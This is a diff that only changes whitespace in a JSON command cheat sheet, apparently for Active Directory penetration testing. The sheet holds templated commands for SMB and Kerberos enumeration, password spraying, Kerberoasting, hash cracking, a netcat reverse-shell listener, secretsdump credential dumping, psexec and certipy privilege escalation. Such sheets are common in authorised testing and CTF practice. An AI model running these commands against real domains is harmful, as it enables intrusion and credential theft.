@@ -5,7 +5,7 @@
       "echo '{{IP}} {{DC.DOMAIN}} {{DOMAIN}}' >> /etc/hosts",
       "smbclient -L //{{IP}} -U {{USER}}",
       "impacket-lookupsid {{DOMAIN}}/{{USER}}@{{IP}}",
-      "netexec smb {{IP}} --generate-krb5-file filename.conf",	
+      "netexec smb {{IP}} --generate-krb5-file filename.conf",
       "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --rid-brute",
       "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --shares",
       "netexec smb {{IP}} -u {{USER}} -p '{{PASSWORD}}' --pass-pol",
@@ -29,12 +29,11 @@
       "netexec smb {{IP}} -u {{USER}} -p password.txt --continue-on-succes",
       "netexec smb {{IP}} -u users.txt -p '{{PASSWORD}}' --continue-on-succes",
       "python3 targetedKerberoast.py -v -d {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}' --request-user TARGET_USER",
-      "rlwrap -cAr nc -nlvp {{PORT}}"                            
+      "rlwrap -cAr nc -nlvp {{PORT}}"
     ],
-    
     "post-exploitation": [
       "evil-winrm -i {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}'",
-      "xfreerdp3 /u:{{USER}} /p:'{{PASSWORD}}' /v:{{IP}}",  
+      "xfreerdp3 /u:{{USER}} /p:'{{PASSWORD}}' /v:{{IP}}",
       "impacket-mssqlclient {{USER}}@{{IP}} -windows-auth",
       "impacket-psexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
       "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
@@ -47,7 +46,7 @@
       "certipy-ad auth -pfx administrator.pfx -ldap-shell -dc-ip {{IP}}"
     ]
   },
-    "KERBEROS": {
+  "KERBEROS": {
     "enumeration": [
       "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv",
       "echo '{{IP}} {{DC.DOMAIN}} {{DOMAIN}}' >> /etc/hosts",
@@ -79,9 +78,8 @@
       "john hash --wordlist=/usr/share/wordlists/rockyou.txt",
       "python3 targetedKerberoast.py -k --dc-host {{DC.DOMAIN}} -u {{USER}} -d {{DOMAIN}}",
       "rlwrap -cAr nc -nlvp {{PORT}}",
-      "./username-anarchy --input-file users.txt --select-format first,firstlast,first.last,firstlast[8],first[4]last[4],firstl,f.last,flast,lfirst,l.first,lastf,last,last.f,last.first,FLast,first1,fl,fmlast,firstmiddlelast,fml,FL,FirstLast,First.Last,Last > anarchy_users.txt"                              
+      "./username-anarchy --input-file users.txt --select-format first,firstlast,first.last,firstlast[8],first[4]last[4],firstl,f.last,flast,lfirst,l.first,lastf,last,last.f,last.first,FLast,first1,fl,fmlast,firstmiddlelast,fml,FL,FirstLast,First.Last,Last > anarchy_users.txt"
     ],
-    
     "post-exploitation": [
       "evil-winrm -i {{DC.DOMAIN}} -K -u {{USER}} -R {{DOMAIN}}",
       "impacket-mssqlclient -K '{{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}' -no-pass",
@@ -94,7 +92,6 @@
       "certipy-ad auth -pfx administrator.pfx -ldap-shell -dc-ip {{IP}}"
     ]
   },
-  
   "web": {
     "enumeration": [
       "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv",
